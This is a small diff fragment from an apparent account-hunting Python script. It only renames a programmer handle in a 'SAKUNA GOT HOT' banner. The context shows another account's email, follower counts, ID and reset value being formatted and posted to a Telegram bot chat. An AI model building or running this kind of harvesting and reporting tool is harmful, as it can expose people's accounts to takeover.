@@ -299,7 +299,7 @@ SAKUNA GOT HOT
 🖼POST : {}
 👨‍🏭RESET : {}
 ▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
-༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 : @sakunadaddy001 @sakunahackz
+༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 : @sakunadaddy001 @sakunahacks
     """.format(name, email, email, followers, following, Id, date, post, rest))
     requests.post(
         f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text=" +
